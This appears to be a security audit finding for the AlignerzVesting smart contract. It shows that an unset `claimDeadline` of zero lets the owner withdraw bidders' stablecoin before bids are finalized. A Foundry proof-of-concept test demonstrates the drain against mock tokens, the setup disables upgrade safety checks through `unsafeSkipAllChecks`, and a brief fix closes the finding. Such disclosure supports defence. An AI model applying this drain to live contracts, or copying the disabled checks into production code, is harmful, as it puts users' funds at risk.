# [000419] Owner can sweep bidding funds pre‑finalization via zero `claimDeadline` gate.
  
  `withdrawPostDeadlineProfit` and `_withdrawPostDeadlineProfit` in [protocol/src/contracts/vesting/AlignerzVesting.sol (lines 914-934)](https://github.com/dualguard/2025-11-alignerz/blob/f7eeed88d91356484c02af6f38b71f27b790828c/protocol/src/contracts/vesting/AlignerzVesting.sol#L914-L934) only gate on `block.timestamp > claimDeadline. claimDeadline` defaults to 0 until `finalizeBids` sets it ([protocol/src/contracts/vesting/AlignerzVesting.sol (lines 783-804)](https://github.com/dualguard/2025-11-alignerz/blob/f7eeed88d91356484c02af6f38b71f27b790828c/protocol/src/contracts/vesting/AlignerzVesting.sol#L783-L804)), so `block.timestamp > 0` is immediately true.

As a result owner can call `withdrawPostDeadlineProfit` / `withdrawPostDeadlineProfits` / `withdrawAllPostDeadlineProfits` while bidding is still open, draining `totalStablecoinBalance` to the treasury. Later `claimRefund` / `claimNFT` will either transfer 0 or revert due to insufficient stablecoin, stranding bidders’ funds and breaking allocations.

## POC

The poc test launches a project (claimDeadline zero), places a bid while bidding is still open, and proves the owner can call `withdrawPostDeadlineProfit` immediately to sweep the bidder’s stablecoin to the treasury.

I adjusted test setup to pass `Options` with `unsafeSkipAllChecks=true` to `Upgrades.deployUUPSProxy` so tests run without the external npx validation dependency.

```diff
diff --git a/protocol/test/AlignerzVestingProtocolTest.t.sol b/protocol/test/AlignerzVestingProtocolTest.t.sol
index 854530a..1f597f9 100644
--- a/protocol/test/AlignerzVestingProtocolTest.t.sol
+++ b/protocol/test/AlignerzVestingProtocolTest.t.sol
@@ -8,6 +8,7 @@ import {AlignerzNFT} from "../src/contracts/nft/AlignerzNFT.sol";
 import {MockUSD} from "../src/MockUSD.sol";
 import {AlignerzVesting} from "../src/contracts/vesting/AlignerzVesting.sol";
 import {Upgrades} from "openzeppelin-foundry-upgrades/Upgrades.sol";
+import {Options} from "openzeppelin-foundry-upgrades/Options.sol";
 import {CompleteMerkle} from "murky/src/CompleteMerkle.sol";
 
 contract AlignerzVestingProtocolTest is Test {
@@ -51,9 +52,15 @@ contract AlignerzVestingProtocolTest is Test {
         token = new Aligners26("26Aligners", "A26Z");
         nft = new AlignerzNFT("AlignerzNFT", "AZNFT", "https://nft.alignerz.bid/");
 
-        address payable proxy = payable(Upgrades.deployUUPSProxy(
-            "AlignerzVesting.sol",
-            abi.encodeCall(AlignerzVesting.initialize, (address(nft))))
+        Options memory opts;
+        opts.unsafeSkipAllChecks = true;
+
+        address payable proxy = payable(
+            Upgrades.deployUUPSProxy(
+                "AlignerzVesting.sol",
+                abi.encodeCall(AlignerzVesting.initialize, (address(nft))),
+                opts
+            )
         );
         vesting = AlignerzVesting(proxy);
 
@@ -147,6 +154,32 @@ contract AlignerzVestingProtocolTest is Test {
         return root;
     }
 
+    function testOwnerCanWithdrawBeforeFinalization() public {
+        // Owner launches a bidding project with whitelist disabled
+        vm.prank(projectCreator);
+        vesting.launchBiddingProject(address(token), address(usdt), block.timestamp, block.timestamp + 10 days, "0x0", false);
+
+        // A bidder commits stablecoin while the project is still open
+        address bidder = bidders[0];
+        uint256 bidAmount = BIDDER_USD;
+        vm.startPrank(bidder);
+        usdt.approve(address(vesting), bidAmount);
+        vesting.placeBid(PROJECT_ID, bidAmount, vesting.vestingPeriodDivisor());
+        vm.stopPrank();
+
+        (, , uint256 totalBefore, , , , , , bool closed, uint256 deadline) = vesting.biddingProjects(PROJECT_ID);
+        assertEq(deadline, 0, "claimDeadline should be unset before finalizeBids");
+        assertFalse(closed, "project should still be open");
+        assertEq(totalBefore, bidAmount, "stablecoin balance should match bid");
+
+        // Owner can drain funds immediately even though bidding is not closed
+        vm.prank(projectCreator);
+        vesting.withdrawPostDeadlineProfit(PROJECT_ID);
+
+        assertEq(usdt.balanceOf(address(vesting)), 0, "funds swept from contract");
+        assertEq(usdt.balanceOf(address(1)), bidAmount, "treasury received bidder funds");
+    }
+
     function test_CompleteVestingFlow() public {
         vm.startPrank(projectCreator);
         vesting.setVestingPeriodDivisor(1);

```

## Recommendation

Require the project to be closed and `claimDeadline != 0` before withdrawal
  